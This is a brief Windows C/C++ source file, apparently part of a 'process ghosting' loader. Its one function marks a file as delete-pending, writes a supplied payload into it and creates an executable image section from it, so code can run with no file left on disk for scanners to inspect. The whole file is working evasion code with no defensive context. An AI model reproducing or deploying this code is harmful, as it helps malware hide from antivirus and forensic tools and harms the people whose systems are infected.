#include "delete_pending_file.h"

#include "..\ntddk.h"
#include "..\utils.h"

HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf, DWORD payloadSize) {
    HANDLE hDelFile = open_file(filePath, false);
    if (hDelFile == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    NTSTATUS status = 0;
    IO_STATUS_BLOCK status_block = { 0 };

    FILE_DISPOSITION_INFORMATION info = { 0 };
    info.DeleteFile = TRUE;

    status = UtSetInformationFile(hDelFile, &status_block, &info, sizeof(info), FileDispositionInformation);
    if (!NT_SUCCESS(status)) {
        return INVALID_HANDLE_VALUE;
    }

    LARGE_INTEGER ByteOffset = { 0 };

    status = UtWriteFile(
        hDelFile,
        NULL,
        NULL,
        NULL,
        &status_block,
        payladBuf,
        payloadSize,
        &ByteOffset,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    status = UtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hDelFile
    );
    if (status != STATUS_SUCCESS) {
        return INVALID_HANDLE_VALUE;
    }
    UtClose(hDelFile);
    hDelFile = nullptr;

    return hSection;
}
